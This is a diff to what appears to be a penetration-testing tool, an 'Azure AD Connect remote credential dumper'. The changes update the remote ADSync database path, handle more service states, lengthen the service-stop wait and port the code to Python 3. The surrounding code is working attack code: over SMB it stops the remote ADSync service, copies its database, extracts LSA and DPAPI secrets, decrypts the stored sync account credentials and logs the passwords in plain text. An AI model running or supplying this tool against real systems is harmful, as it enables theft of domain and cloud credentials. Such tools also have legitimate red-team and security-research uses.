@@ -75,9 +75,9 @@ class ADSRemoteOperations(RemoteOperations):
             self.__checkServiceStatus()
             logging.info('Downloading ADSync database files')
             with open('ADSync.mdf','wb') as fh:
-                self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf', fh.write)
+                self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync2019\ADSync.mdf', fh.write)
             with open('ADSync_log.LDF','wb') as fh:
-                self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync_log.ldf', fh.write)
+                self.__smbConnection.getFile('C$',r'Program Files\Microsoft Azure AD Sync\Data\ADSync2019\ADSync_log.ldf', fh.write)
         finally:
             self.__restore_adsync()
 
@@ -288,27 +288,35 @@ class ADSRemoteOperations(RemoteOperations):
             logging.info('Service %s is in stopped state'% self.__serviceName)
             self.__shouldStart = False
             self.__stopped = True
+            self.__shouldStop = False
         elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
             logging.debug('Service %s is running'% self.__serviceName)
             self.__shouldStart = True
             self.__stopped  = False
+            self.__shouldStop = True
+        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOP_PENDING:
+            logging.debug('Service %s is still stopping'% self.__serviceName)
+            self.__shouldStart = True
+            self.__stopped  = False
+            self.__shouldStop = False
         else:
             raise Exception('Unknown service state 0x%x - Aborting' % ans['lpServiceStatus']['dwCurrentState'])
         # If service is running, stop it temporarily
         if self.__stopped is False:
-            logging.info('Stopping service %s' % self.__serviceName)
-            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
+            if self.__shouldStop:
+                logging.info('Stopping service %s' % self.__serviceName)
+                scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
             i = 0
             time.sleep(3)
             # Wait till it is stopped
-            while i < 20:
+            while i < 60:
                 ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
                 if ans['lpServiceStatus']['dwCurrentState'] != scmr.SERVICE_STOPPED:
                     i+=1
                     time.sleep(1)
                 else:
                     return
-            raise Exception('Failed to stop service within 20 seconds - Aborting')
+            raise Exception('Failed to stop service within 60 seconds - Aborting')
 
 
 
@@ -418,7 +426,7 @@ class DumpSecrets:
             try:
                 try:
                     self.connect()
-                except Exception, e:
+                except Exception as e:
                     if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                         # SMBConnection failed. That might be because there was no way to log into the
                         # target system. We just have a last resort. Hope we have tickets cached and that they
@@ -437,7 +445,7 @@ class DumpSecrets:
                 logging.info('Querying LSA secrets from remote registry')
                 self.__remoteOps.enableRegistry()
                 bootKey = self.__remoteOps.getBootKey()
-            except Exception, e:
+            except Exception as e:
                 self.__canProcessSAMLSA = False
                 if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
                     and self.__doKerberos is True:
@@ -458,7 +466,7 @@ class DumpSecrets:
                 self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                isRemote=self.__isRemote, history=False, perSecretCallback = self.getDPAPI_SYSTEM)
                 self.__LSASecrets.dumpSecrets()
-            except Exception, e:
+            except Exception as e:
                 if logging.getLogger().level == logging.DEBUG:
                     import traceback
                     traceback.print_exc()
@@ -494,7 +502,7 @@ class DumpSecrets:
                     logging.info('Extracting AD Sync encryption keys from registry')
                     self.__AdSync = ADSync(ADSYNCFileName, isRemote=self.__isRemote)
                     self.__AdSync.dump()
-                except Exception, e:
+                except Exception as e:
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
                         traceback.print_exc()
@@ -502,7 +510,7 @@ class DumpSecrets:
 
                 try:
                     cryptkeys = self.__AdSync.process(self.__remoteOps, self.dpapiSystem['MachineKey'], string_to_bin(mdbdata['entropy']))
-                except Exception, e:
+                except Exception as e:
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
                         traceback.print_exc()
@@ -548,14 +556,14 @@ class DumpSecrets:
                         logging.info('\tPassword: %s', fpw)
 
 
-            except Exception, e:
+            except Exception as e:
                 #if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
                 logging.error('Recprd decryption failed: %s', str(e))
 
 
-        except (Exception, KeyboardInterrupt), e:
+        except (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
@@ -586,7 +594,7 @@ if __name__ == '__main__':
         # Output is redirected to a file
         sys.stdout = codecs.getwriter('utf8')(sys.stdout)
 
-    print 'Azure AD Connect remote credential dumper - by @_dirkjan'
+    print('Azure AD Connect remote credential dumper - by @_dirkjan')
 
     parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
                                                       "the remote machine without executing any agent there.")
@@ -654,7 +662,7 @@ if __name__ == '__main__':
     dumper = DumpSecrets(remoteName, username, password, domain, options)
     try:
         dumper.dump()
-    except Exception, e:
+    except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             import traceback
             traceback.print_exc()
